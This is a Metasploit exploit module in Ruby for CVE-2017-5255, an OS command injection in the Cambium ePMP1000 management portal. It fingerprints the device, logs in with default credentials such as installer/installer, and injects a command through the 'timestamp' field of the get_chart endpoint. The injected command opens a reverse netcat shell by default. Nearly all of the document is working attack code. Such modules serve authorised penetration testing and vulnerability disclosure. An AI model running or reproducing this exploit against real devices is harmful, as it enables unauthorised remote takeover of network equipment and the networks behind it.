# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => "Cambium ePMP1000 &#039;get_chart&#039; Shell via Command Injection (v3.1-3.5-RC7)",
      &#039;Description&#039; => %{
          This module exploits an OS Command Injection vulnerability in Cambium
          ePMP1000 device management portal. It requires any one of the following login
          credentials - admin/admin, installer/installer, home/home - to set up a reverse
          netcat shell. The module has been tested on versions 3.1-3.5-RC7.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;Karn Ganeshen <KarnGaneshen[at]gmail.com>&#039;
        ],
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2017-5255&#039;],
          [&#039;URL&#039;, &#039;https://blog.rapid7.com/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities&#039;]
        ],
      &#039;Privileged&#039; => true,
      &#039;Targets&#039; =>
        [
          [&#039;CMD&#039;,
            {
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Platform&#039; => &#039;unix&#039;
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Dec 18 2017&#039;,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_netcat&#039; })
    )

    register_options(
      [
        Opt::RPORT(80),  # Application may run on a different port too. Change port accordingly.
        OptString.new(&#039;USERNAME&#039;, [true, &#039;A specific username to authenticate as&#039;, &#039;installer&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;A specific password to authenticate with&#039;, &#039;installer&#039;])
      ], self.class
    )

    deregister_options(&#039;DB_ALL_CREDS&#039;, &#039;DB_ALL_PASS&#039;, &#039;DB_ALL_USERS&#039;, &#039;USER_AS_PASS&#039;, &#039;USERPASS_FILE&#039;, &#039;USER_FILE&#039;, &#039;PASS_FILE&#039;, &#039;BLANK_PASSWORDS&#039;, &#039;BRUTEFORCE_SPEED&#039;, &#039;STOP_ON_SUCCESS&#039;)
  end

  #
  # Fingerprinting
  #
  def is_app_epmp1000?
    begin
      res = send_request_cgi(
        {
          &#039;uri&#039;       => &#039;/&#039;,
          &#039;method&#039;    => &#039;GET&#039;
        }
      )
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    good_response = (
      res &&
      res.code == 200 &&
      (res.body.include?(&#039;cambium.min.css&#039;) || res.body.include?(&#039;cambiumnetworks.com&#039;) && res.body.include?(&#039;https://support.cambiumnetworks.com/files/epmp/&#039;))
    )

    if good_response
      get_epmp_ver = res.body.match(/"sw_version">([^<]*)/)
      if !get_epmp_ver.nil?
        epmp_ver = get_epmp_ver[1]
        if !epmp_ver.nil?
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...")
          return true, epmp_ver
        else
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000...")
          epmp_ver = &#039;&#039;
          return true, epmp_ver
        end
      end
    else
      print_error("#{rhost}:#{rport} - Application does not appear to be Cambium ePMP 1000. The target is not vulnerable.")
      epmp_ver = nil
      return false
    end
  end

  #
  # check
  #
  def check
    success, epmp_ver = is_app_epmp1000?
    if (success != &#039;false&#039; && !epmp_ver.nil? && epmp_ver >= &#039;3.1&#039;)
      return CheckCode::Vulnerable
    else
      return CheckCode::Safe # Using &#039;Safe&#039; here to imply this ver is not exploitable using the module&#039;
    end
  end

  #
  # Login
  #
  def login(user, pass)
    res = send_request_cgi(
      {
        &#039;uri&#039; => &#039;/cgi-bin/luci&#039;,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;headers&#039; => {
          &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;,
          &#039;Accept&#039; => &#039;application/json, text/javascript, */*; q=0.01&#039;
        },
        &#039;vars_post&#039; =>
          {
            &#039;username&#039; => &#039;dashboard&#039;,
            &#039;password&#039; => &#039;&#039;
          }
      }
    )

    cookies = res.get_cookies_parsed
    check_sysauth = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s

    good_response = (
      res &&
      res.code == 200 &&
      check_sysauth.include?(&#039;sysauth&#039;)
    )

    if good_response
      sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
      sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)

      res = send_request_cgi(
        {
          &#039;uri&#039; => &#039;/cgi-bin/luci&#039;,
          &#039;method&#039; => &#039;POST&#039;,
          &#039;cookie&#039; => sysauth_value,
          &#039;headers&#039; => {
            &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;,
            &#039;Accept&#039; => &#039;application/json, text/javascript, */*; q=0.01&#039;,
            &#039;Connection&#039; => &#039;close&#039;
          },
          &#039;vars_post&#039; =>
            {
              &#039;username&#039; => user,
              &#039;password&#039; => pass,
            }
        }
      )

      good_response = (
        res &&
        res.code == 200 &&
        !res.body.include?(&#039;auth_failed&#039;)
      )

      if good_response
        print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")

        # check if max_user_number_reached?
        if !res.body.include?(&#039;max_user_number_reached&#039;)
          # get the cookie now
          cookies = res.get_cookies_parsed
          stok_value_dirty = res.body.match(/"stok": "(.*?)"/)
          stok_value = "#{stok_value_dirty}".split(&#039;"&#039;)[3]
          sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
          sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)

          final_cookie = "#{sysauth_value}" + &#039;usernameType_80=admin; stok_80=&#039; + "#{stok_value}"

          # create config_uri
          config_uri_get_chart = &#039;/cgi-bin/luci/;stok=&#039; + "#{stok_value}" + &#039;/admin/get_chart&#039;
          return final_cookie, config_uri_get_chart
        else
          print_error(&#039;The credentials are correct but maximum number of logged-in users reached. Try again later.&#039;)
          final_cookie = &#039;skip&#039;
          config_uri_dump_config = &#039;skip&#039;
          config_uri_reset_pass = &#039;skip&#039;
          config_uri_get_chart = &#039;skip&#039;
          return final_cookie, config_uri_get_chart
        end
      else
        print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
        final_cookie = &#039;skip&#039;
        config_uri_get_chart = &#039;skip&#039;
        return final_cookie, config_uri_get_chart
      end
    end
  end

  #
  # open cmd_shell
  #
  def cmd_shell(config_uri, cookie)
    command = payload.encoded
    inject = &#039;|&#039; + "#{command}"
    clean_inject = CGI.unescapeHTML(inject.to_s)

    print_status(&#039;Sending payload...&#039;)

    res = send_request_cgi(
      {
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => config_uri,
        &#039;cookie&#039; => cookie,
        &#039;headers&#039; => {
          &#039;Accept&#039; => &#039;*/*&#039;,
          &#039;Accept-Language&#039; => &#039;en-US,en;q=0.5&#039;,
          &#039;Content-Encoding&#039; => &#039;application/x-www-form-urlencoded; charset=UTF-8&#039;,
          &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;,
          &#039;Connection&#039; => &#039;close&#039;
        },
        &#039;vars_post&#039; =>
          {
            &#039;measure&#039; => &#039;s&#039;, # This parameter can also be used for injection
            &#039;timestamp&#039; => clean_inject,
            &#039;debug&#039; => 0
          }
      }, 25
    )
    handler
  end

  # exploit

  def exploit
    _success, epmp_ver = is_app_epmp1000?
    if (epmp_ver < &#039;3.1&#039; || epmp_ver > &#039;3.5&#039; && epmp_ver != &#039;3.5-RC7&#039;)
      print_error(&#039;This module is applicable to versions 3.1-3.5-RC7 only. Exiting now.&#039;)
      return
    else
      cookie, config_uri_get_chart = login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
      if cookie == &#039;skip&#039; && config_uri_get_chart == &#039;skip&#039;
        return
      else
        cmd_shell(config_uri_get_chart, cookie)
      end
    end
  end
end

